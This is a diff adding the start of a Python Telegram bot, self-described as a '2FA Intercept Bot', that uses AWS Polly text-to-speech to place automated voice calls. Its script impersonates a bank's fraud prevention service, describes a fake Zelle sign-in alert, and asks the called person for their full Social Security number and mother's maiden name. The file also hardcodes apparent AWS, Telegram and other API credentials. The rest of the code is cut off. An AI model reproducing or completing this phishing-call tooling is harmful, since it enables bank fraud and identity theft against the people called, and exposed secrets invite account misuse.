@@ -1,0 +1,76 @@
+import telegram
+import requests
+import time
+import boto3
+
+# AWS credentials
+access_key = 'AKIARQ7IRN57RPTO6Т'
+secret_key = '7TP6nSQwd1d9NSOUbuXwP18BdH9/ hiCq6M461YCW'
+region_name = 'us-west-2'  # Update with your desired AWS region
+
+# Telegram Bot API token
+TOKEN = '5846941697:AAHjW8mXBhOHL6CWFNaO
+ou15gupQ7Uh7tyl'
+
+# Swillo API credentials
+SWILLO_API_KEY = 'SKOb6c4c6ес2d79044d8c1e8c0c31981e4'
+SWILLO_API_SECRET = 'hCWdKriFRcCiNTxizyskiJMPaihdwHKw'
+
+# Initialize Telegram bot
+bot = telegram.Bot(token=TOKEN)
+
+# Telegram bot webhook endpoint
+WEBHOOK_URL = 'YOUR_WEBHOOK_URL'
+
+# User information
+USER_DATA = {}
+
+# Keypad inputs tracker
+keypad_inputs = []
+
+# Manual English language script
+SCRIPT = {
+    'welcome': "Welcome to the 2FA Intercept Bot!\n\n"
+               "To get started, use the /setphone command to set the phone number you want to intercept.\n"
+               "Once the phone number is set, use the /setname command to provide your first and last name.\n"
+               "Finally, use the /options command to see a list of available actions you can perform.",
+    'phone_set': "Phone number set to: {phone}\n\n"
+                 "Now, use the /setname command to provide your first and last name.",
+    'name_set': "Name set to: {first_name} {last_name}\n\n"
+                "You are now ready to perform actions. Use the /options command to see the available options.",
+    'call_initiated': "Call initiated. Please wait for the call to be answered.",
+    'call_answered': "This is an automated voice call from {bank_name} fraud & prevention service. "
+                     "This call will be monitored on a recorded line.",
+    'pause': " ",  # Add a pause of a second between sentences
+    'afternoon': "Good afternoon. Today we are calling you regarding your account being flagged "
+                 "due to an unusual sign-in attempt on an HP laptop that tried to send two $500 transactions "
+                 "through Zelle 30 minutes ago.",
+    'recognize': "Do you recognize this? If you don't, please press '1'.",
+    'option_1': "Press '1' on your keypad if you do not recognize this transaction.",
+    'option_2': "Press '2' on your keypad if you recognize and approve of this transaction.",
+    'security_verification': "Okay, understood. We are going to need some information for security verification purposes.",
+    'ask_ssn': "Please say your full 9-digit social security number for security purposes.",
+    'ask_mothers_name': "Thank you. Now, please provide your mother's maiden name for verification.",
+    'verify_mothers_name': "Okay, give me a moment to verify that information..."
+}
+
+# Function to generate speech using AWS Polly TTS service
+def generate_speech(text):
+    polly = boto3.client('polly',
+                         aws_access_key_id=access_key,
+                         aws_secret_access_key=secret_key,
+                         region_name=region_name)
+
+    response = polly.synthesize_speech(
+        Text=text,
+        OutputFormat='mp3',
+        VoiceId='Joanna'
+    )
+
+    file_path = "output.mp3"  # Output file path
+    with open(file_path, "wb") as file:
+        file.write(response['AudioStream'].read())
+        print("Audio content written to file 'output.mp3'")
+
+
+# Rest of your code
